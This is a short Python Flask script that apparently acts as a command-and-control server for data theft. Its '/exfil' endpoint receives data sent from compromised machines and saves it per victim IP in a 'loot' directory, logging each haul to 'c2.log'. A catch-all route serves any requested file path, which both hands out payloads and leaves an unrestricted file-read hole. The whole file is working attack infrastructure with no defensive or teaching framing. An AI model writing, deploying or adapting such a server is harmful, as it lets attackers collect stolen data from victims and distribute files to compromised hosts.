from flask import Flask, request, send_file, abort
import os
import logging
from werkzeug.utils import secure_filename

app = Flask(__name__)
LOOT_DIR = "loot"
os.makedirs(LOOT_DIR, exist_ok=True)

logging.basicConfig(filename='c2.log', level=logging.INFO)

@app.route('/exfil', methods=['POST'])
def exfil():
    try:
        ip = request.remote_addr
        data = request.get_data(as_text=True)
        if not data:
            abort(400)
        filename = secure_filename(ip) + ".txt"
        with open(os.path.join(LOOT_DIR, filename), "a") as f:
            f.write(data + "\n")
        logging.info(f"Exfil from {ip}: {len(data)} bytes")
        return "OK", 200
    except Exception as e:
        logging.error(f"Exfil error: {e}")
        return "Error", 500

@app.route('/<path:filepath>')
def serve_file(filepath):
    try:
        return send_file(filepath, as_attachment=True)
    except FileNotFoundError:
        abort(404)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8080, threaded=True)